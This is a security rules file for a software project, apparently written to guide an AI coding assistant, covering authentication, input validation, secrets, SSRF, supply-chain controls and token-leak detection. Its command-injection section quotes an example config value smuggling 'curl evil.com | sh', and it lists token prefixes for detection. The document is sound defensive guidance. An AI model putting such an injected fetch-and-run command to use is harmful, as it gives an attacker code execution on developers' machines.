---
tier: always
---

# Security Rules (Always-on)

Core security principles that apply to ALL code. Web-specific rules (CSP, rate limiting, CSRF) are in `rules/opt-in-stack/security-web.md`. Compliance and AI/LLM rules live in the baseline `security-compliance` rules (not vendored into this plugin).

## SEC Rule Numbering Convention
SEC identifiers are assigned sequentially as rules are created. Gaps are intentional:
- **SEC-001 to SEC-003**: Reserved for future core authentication/authorization rules
- **SEC-004 to SEC-009**: Core security rules (auth, validation, SQL, secrets, errors)
- **SEC-010 to SEC-012**: Compliance rules (documented in the baseline `security-compliance` rules, not vendored into this plugin)
- **SEC-013 to SEC-015**: Advanced protection (XXE, SSRF, crypto)
- **SEC-016 to SEC-017**: Data integrity (CSV injection, session hardening — in rules/opt-in-stack/security-web.md)
- **SEC-018 to SEC-019**: Reserved candidates (prototype pollution CWE-1321, unsafe deserialization CWE-502 — currently covered by SEC-006)
- **SEC-020**: Supply chain security (dependency trust, build script control)
- **SEC-021**: Settings-allowlist token guard (PAT/token leakage into `.claude/settings.json` / `.claude/settings.local.json` permission entries)

## Authentication (SEC-004: Auth-at-Boundary)
- Every server action MUST authenticate first: `const { user, businessId, supabase } = await requireAuth()`
- Client-side: `supabase.auth.getSession()` — never trust client data server-side.
- Never pass user IDs from client. Always derive from session.

## Input Validation (SEC-006)
- Zod validation on ALL user inputs. No exceptions.
- Minimum string lengths where appropriate (prevent empty submissions).
- Sanitize before database queries. Use parameterized queries only.

## SQL/PostgREST (SEC-007)
- NEVER use template literals for SQL: `` supabase.from(`${table}`) `` is forbidden.
- Always use parameterized queries or Supabase query builder.
- RLS (Row Level Security) on every table. No `service_role` key in client code.

## Secrets Management
- All secrets in `.env` files. Never hardcode API keys, tokens, or passwords.
- `.env`, `.env.local`, `.env.production` in `.gitignore`. Always.
- `.env.example` with dummy values for every secret (documented).
- Gitleaks pre-commit hook catches accidental secret commits.
- Rotate secrets on any suspected exposure. Immediately.

### Secrets Inventory (SEC-005)
Once a service crosses ~10 managed secrets, `.env.example` alone stops being a useful audit tool — it documents shape, not lifecycle. Commit a canonical inventory at `.claude/docs/SECRETS-INVENTORY.md` with one row per variable: **Variable | Purpose | Status | Expiry | Backup / Rotation**. Status is a closed enum: `OK`, `EINGESCHRÄNKT` (degraded scope), `KAPUTT` (broken/revoked), `INAKTIV` (feature disabled, kept for history). Template: `templates/shared/.claude/docs/SECRETS-INVENTORY.template.md`. Harvested from clank (~40 entries) where drift between "what's in .env" and "what's actually in use" became unmanageable without it. Sweep quarterly; open a `priority:high` issue for any secret expiring in < 30 days. Rotation schedule per secret type lives in the baseline `infrastructure` rules (not vendored into this plugin).

## Error Exposure (SEC-009)
- Never return `error.message` directly to the client.
- Map errors to user-friendly messages. Log originals server-side.
- Stack traces: development only, never in production responses.

## XXE Prevention (SEC-013)
- Disable external entity processing: `fast-xml-parser` → `processEntities: false`. Never use `DOMParser` with untrusted XML.
- Prefer JSON over XML at all API boundaries. If XML required, validate against strict XSD first.
- Never pass user-supplied file content directly to XML parsers without sanitization.

## SSRF Prevention (SEC-014)
- Use `safeFetch()` / `safeFetchJSON()` from `@your-org/http-client` for all user-supplied URLs. These block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, ::1, 169.254.x) and non-HTTP schemes before requesting.
- For internal service-to-service calls (e.g., Clank → an internal host on a private IP range), use `fetchWithTimeout()` or pass `allowPrivateNetworks: true`.
- **DNS rebinding defense:** Set `dnsValidation: true` in `safeFetch()`/`safeFetchJSON()` options to resolve DNS and validate the resolved IP before connecting. When enabled, DNS validation is also applied on each redirect hop. **Node.js-only** — uses `dns.promises.lookup()`. For standalone use, `resolveAndValidate()` is exported from `@your-org/http-client`.
- Set explicit timeouts (5s default) and limit redirects (max 3 with re-validation) on server-side HTTP clients.
- Redirect handling: use `redirect: 'manual'` and re-validate each Location URL via `validateUrl()` before following. This prevents redirect-based SSRF attacks. The `safeFetch()` function in `@your-org/http-client` implements this pattern with `RedirectLimitError` for exceeded limits.

## Dependencies
- `pnpm audit --prod --audit-level=high` in CI pipeline. Block deploys on high/critical vulnerabilities.
- Gitleaks (37 rules) + Semgrep SAST (65+ custom rules in `.semgrep.yml` + 4 managed rulesets) in CI.
- Review `node_modules` additions in PRs (supply chain awareness).

## Supply Chain Security (SEC-020)
- Set `ignore-scripts=true` in `.npmrc` as the global default. No package may run install/postinstall/prepare scripts unless explicitly allowlisted via `only-built-dependencies-of[]`. This is the single most effective defense against Axios-style postinstall attacks.
- Allowlisted packages (native binaries that genuinely need install scripts): `@your-org/*`, `esbuild`, `sharp`, `@playwright/test`, `@sentry/cli`, `prisma`, `better-sqlite3`, `@typescript/native-preview`. Only add new entries after verifying the package requires postinstall.
- Use `block-exotic-subdeps=true` in `.npmrc` to prevent transitive dependencies from using git or tarball sources. Mitigates PackageGate-class attacks (CVE-2026-xxxx).
- Set `minimum-release-age=1440` (24 hours) to delay package updates, giving security vendors time to detect malicious releases.
- Use `trust-policy=no-downgrade` to reject packages with lower trust signals than previously installed versions.
- Never use `git+ssh://` or `git+https://` as dependency specifiers in `package.json`. Always use npm registry versions.
- Audit all new dependencies before adding: check npm download trends, last publish date, maintainer count. Minimum 1000 weekly downloads unless justified.
- In CI: always use `pnpm install --frozen-lockfile` to prevent lockfile tampering.
- Registry hijacking is mitigated by pnpm's scoped registry config in `.npmrc` (`@your-org:registry=...` + `strict-ssl=true`). pnpm v9 lockfiles do not embed registry URLs — they resolve from `.npmrc` at install time.

### Session Config Command Trust (Quality-Gate Command Injection)

The quality-gate loop resolves gate commands via three-level precedence (explicit override → Session Config → built-in defaults) and executes them with `spawnSync(cmd, { shell: true })`. A malicious commit to `CLAUDE.md` could inject shell metacharacters (e.g., `test-command: npm test; curl evil.com | sh`), making this RCE-equivalent within the repo's trust model.

**Why this is acceptable by design:**

- **VCS anchors trust:** All file changes, including `CLAUDE.md` edits, are commit-gated. Malicious Session Config changes require a commit to land in `HEAD` — the change is visible in `git log` and subject to human code review before merge.
- **No privilege escalation:** The fixer-agent dispatch happens within the same session's effective permissions. A developer with permission to commit to the repo already has permission to execute arbitrary code via any other file (e.g., `package.json` scripts, `.husky/` hooks, test files). Session Config `*-command` is **not** a new attack surface — it is equivalent to the existing commit-review trust model.
- **Bounded scope:** Commands are only read and executed during inter-wave Quality-Gate runs with `verification-auto-fix.enabled: true` (default `false`). A repo without that flag enabled never parses Session Config commands at all.

**The four command-bearing surfaces (sanctioned):**

1. `test-command` — Quality-Gate test runner.
2. `typecheck-command` — Quality-Gate typecheck runner.
3. `lint-command` — Quality-Gate lint runner.
4. `custom-phases[].command` (#637) — repo-declared deterministic close/housekeeping phases run at session-end Phase 2.5 via Bash with exit-code gating. Same VCS-trust-anchor model as the trio above: any change is commit-gated and visible in `git log`. As defense-in-depth, `scripts/lib/config/custom-phases.mjs` additionally rejects shell metacharacters in `command`/`review`/`name` and drops the offending record with a WARN.

**Operator audit checklist:**

1. **Review Session Config drift** as part of standard code review. Any PR that modifies a command-bearing key MUST show the before/after — unexpected values are an audit opportunity.
2. **Watch for unexpected Session Config keys.** If a PR introduces a new command-bearing entry outside the documented set (`lint-command`, `typecheck-command`, `test-command`, and `custom-phases[].command`), investigate — these are the surfaces `scripts/parse-config.mjs` parses into executable commands.
3. **Treat Session Config like code.** A malicious Session Config change is equivalent to a malicious code change. Rely on your existing VCS review process; do not add extra gates for Session Config specifically.

Cross-references: `scripts/lib/qg-command-drift-banner.mjs` (session-start banner for `*-command` drift) · `scripts/lib/quality-gate.mjs` (`runQualityGateWithRetry`) · `.claude/rules/quality-gates-autofix.md` (auto-fix loop behaviour).

### SEC-020-1: Package Legitimacy Audit (Slopcheck — #520)

Pattern 2 of the gsd Pattern Adoption (Issue #520) provides `classifyPackages()`
from `scripts/lib/slopcheck.mjs` to defend against LLM-hallucinated package
names ("Slopsquatting" — documented incidents 2024/2025). When
`slopcheck.enabled: true` in Session Config (default: `false`), the plan-skill
runs Phase 3.5 Package-Audit on PRD-mentioned packages and the discovery-probe
`supply-chain-slopcheck.mjs` runs over the repo's `package.json` /
`requirements.txt` / `Cargo.toml`.

Classifications:
- **LEGITIMATE**: package exists + download_count > threshold
- **ASSUMED**: package exists but very new / low downloads (warning, not block)
- **SUS**: audit warning hit (operator confirmation required)
- **SLOP**: package not in registry — possible LLM hallucination (hard block in plan-flow)

This is **complementary** to the SEC-020 baseline (`ignore-scripts=true`,
`block-exotic-subdeps=true`, `minimum-release-age=1440`): SEC-020 prevents
post-install execution of malicious packages; Slopcheck prevents adopting
non-existent (typosquat-target) packages in the first place.

Cross-references:
- API: `scripts/lib/slopcheck.mjs`
- Discovery probe: `skills/discovery/probes/supply-chain-slopcheck.mjs`
- Plan-skill Phase 3.5: `skills/plan/SKILL.md`
- Issue: #520

## Owner-Privacy Pre-Commit Hook (#494)
- Repositories with private slugs, personal home paths, or non-public hosts MUST run an owner-leakage scanner as a pre-commit hook stage — CI catching the same class of leak is too late (it lands on the public branch first).
- Reuse the same scanner CI runs (`scripts/lib/validate/check-owner-leakage.mjs` or equivalent). Local/CI parity is essential; a separate local-only ruleset drifts and gives false confidence.
- Invocation pattern in `.husky/pre-commit`:
  ```sh
  node scripts/lib/validate/check-owner-leakage.mjs "$(git rev-parse --show-toplevel)" >/dev/null 2>&1 || {
    echo "✗ check-owner-leakage: privacy leak detected in tracked files. Commit blocked." >&2
    echo "  Run \`node scripts/lib/validate/check-owner-leakage.mjs .\` for details." >&2
    exit 1
  }
  ```
- The scanner runs against the staged tree (`git ls-files` sees staged-but-not-committed files), closing the `git add <leak> && git commit` gap. This was the root cause of three pre-#494 CI red incidents (deep-1, deep-2, deep-3); the hook is the durable fix.
- `git commit --no-verify` bypass remains available but logs a warning per `.claude/rules/development.md` Git Safety Protocol — use only after triage.
- Regression test: every repo using this pattern should have a husky test asserting hook contains the scanner invocation, plus E2E tests that plant leaks in a tmp git repo and assert the commit is blocked. Reference: `tests/husky/pre-commit-owner-leakage.test.mjs`.

## Settings-Allowlist Token Guard (SEC-021, #728b)
- Never place a live PAT/token as a permission-allowlist entry in `.claude/settings.json` or `.claude/settings.local.json` (e.g. a `Bash(glab ... glpat-xxxxxxxxxxxxxxxxxxxx:...)` allowlist line). A live GitLab PAT surfaced exactly this way in a portfolio repo — pasted in cleartext into a settings allowlist entry. Use an env-var reference or the OS keychain instead; never the raw secret value.
- `.gitleaks.toml` (37 rules) is the canonical regex source for token shapes (`glpat-`, `ghp_`, `github_pat_`, `sk-ant-`, `AKIA`, …) and `scripts/lib/validate/check-test-fixture-shapes.mjs` (patterns F5–F8) is the in-repo prior art for the same shapes applied to test fixtures. Do not maintain a fifth copy of these regexes — the `repo-audit` Category 6 grep row (`skills/repo-audit/SKILL.md`) is a deliberate high-signal SUBSET of the 5 prefixes above, not a competing source of truth.
- **Why `check-owner-leakage.mjs` does not cover this:** that scanner enumerates `git ls-files` — tracked files only, by design (see § "Owner-Privacy Pre-Commit Hook" above). `.claude/settings.local.json` is conventionally gitignored/untracked, so a token pasted there is structurally invisible to the pre-commit hook. `repo-audit`'s on-disk grep (reads the file directly, not via `git ls-files`) is the only mechanism in this repo that inspects the live file regardless of tracked status.

## OWASP Top 10 2021 Mapping

| OWASP ID | Risk | Baseline Coverage |
|---|---|---|
| A01 | Broken Access Control | SEC-004 (Auth-at-Boundary), SEC-007 (RLS), rules/opt-in-stack/security-web.md (CSRF), open-redirect (CWE-601), path-traversal (CWE-22) |
| A02 | Cryptographic Failures | SEC-015 (below), weak-hash (CWE-328), TLS validation (CWE-295), Math.random detection (CWE-338), Semgrep rules #37-38, #42-43 |
| A03 | Injection | SEC-006 (Zod), SEC-007 (parameterized queries), SEC-013 (XXE), prototype-pollution (CWE-1321), ReDoS (CWE-1333), DOMPurify sanitization |
| A04 | Insecure Design | MVP scope rules (mvp-scope.md), threat modeling at design phase |
| A05 | Security Misconfiguration | rules/opt-in-stack/security-web.md (CSP, headers, CORS), CORS wildcard (CWE-942), baseline infrastructure rules — Docker hardening (not vendored) |
| A06 | Vulnerable Components | Dependencies section (pnpm audit), CI Semgrep (65+ custom rules) + Gitleaks (37 rules) |
| A07 | Auth Failures | SEC-004 (requireAuth), SEC-017 (session hardening in rules/opt-in-stack/security-web.md) |
| A08 | Data Integrity Failures | CI/CD pipeline integrity, Gitleaks, pnpm lockfile, SEC-020 (supply chain), json-parse-untrusted (CWE-502) |
| A09 | Logging Failures | rules/opt-in-stack/backend.md (structured logging), @your-org/logger |
| A10 | SSRF | SEC-014 (safeFetch/safeFetchJSON, redirect re-validation) |

## Cryptographic Failures (SEC-015)
- TLS 1.3 minimum for all external connections. Never allow TLS 1.0/1.1.
- Password hashing: bcrypt (cost 12+) or scrypt. Never MD5, SHA1, or plain SHA256 for passwords.
- Use `crypto.subtle` or Node.js `crypto` module for cryptographic operations. Never custom crypto.
- Secrets at rest: encrypt with AES-256-GCM. Never store secrets in plaintext outside `.env` files.
- Random values: `crypto.getRandomValues()` or `crypto.randomUUID()`. Never `Math.random()` for security-sensitive values (tokens, keys, nonces, session IDs). `Math.random()` is acceptable for non-security purposes like retry jitter, UI randomization, and shuffling display order.
- JWT: RS256 or ES256 for signing. Never HS256 with weak secrets. Verify `alg` header to prevent algorithm confusion.

## Vulnerability Disclosure
- Every repo SHOULD include a `SECURITY.md` with responsible disclosure process, response timelines, and scope definition.
- Template at `templates/shared/SECURITY.md`. Customize contact email and scope per project.

## See Also
development.md · testing.md · mvp-scope.md · cli-design.md · parallel-sessions.md
